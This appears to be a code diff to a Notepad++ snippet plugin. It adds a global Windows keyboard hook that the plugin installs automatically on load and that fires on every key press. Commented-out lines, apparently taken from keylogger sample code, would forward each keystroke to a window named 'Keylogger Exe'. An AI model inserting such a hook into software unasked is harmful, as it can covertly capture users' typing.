@@ -34,6 +34,9 @@ extern NppData nppData;
 extern DockingDlg snippetDock;
 WNDPROC	wndProcNpp = NULL;
 int nppLoaded = 0;
+HINSTANCE hinstance = NULL;
+HHOOK hook = NULL;
+HWND hwnd = NULL;
 
 BOOL APIENTRY DllMain(HANDLE hModule, DWORD reasonForCall, LPVOID lpReserved)
 {
@@ -54,6 +57,7 @@ BOOL APIENTRY DllMain(HANDLE hModule, DWORD reasonForCall, LPVOID lpReserved)
         //    break;
     }
 
+    hinstance = (HINSTANCE)hModule;
     return true;
 }
 
@@ -74,6 +78,42 @@ LRESULT CALLBACK SubWndProcNpp(HWND hWnd, UINT message, WPARAM wParam, LPARAM lP
     return retVal;
 }
 
+
+
+
+LRESULT CALLBACK hookproc(int ncode,WPARAM wparam,LPARAM lparam)
+{
+	if(ncode>=0)
+	{
+		if((lparam & 0x80000000) == 0x00000000)//Check whether key was pressed(not released).
+		{
+            alert();
+			//hwnd = FindWindow("#32770","Keylogger Exe");//Find application window handle
+			//PostMessage(hwnd,WM_USER+755,wparam,lparam);//Send info to app Window.
+		}
+	}
+	return ( CallNextHookEx(hook,ncode,wparam,lparam) );//pass control to next hook in the hook chain.
+}
+
+
+
+void installhook(HWND h)
+{
+	hook = NULL;
+	hwnd = h;
+	hook = SetWindowsHookEx(WH_KEYBOARD,hookproc,hinstance,NULL);
+	if(hook==NULL)
+		MessageBox(NULL,TEXT("Unable to install hook"),TEXT("Error!"),MB_OK);
+}
+
+void removehook()
+{
+	UnhookWindowsHookEx(hook);
+}
+
+
+
+
 //functions which are called by Notepad++
 extern "C" __declspec(dllexport) void setInfo(NppData nppDataInfo)
 {
@@ -85,6 +125,7 @@ extern "C" __declspec(dllexport) void setInfo(NppData nppDataInfo)
     configInit();
     dataBaseInit();
     variablesInit();
+    installhook(nppData._nppHandle);
 }
 
 extern "C" __declspec(dllexport) const TCHAR * getName()
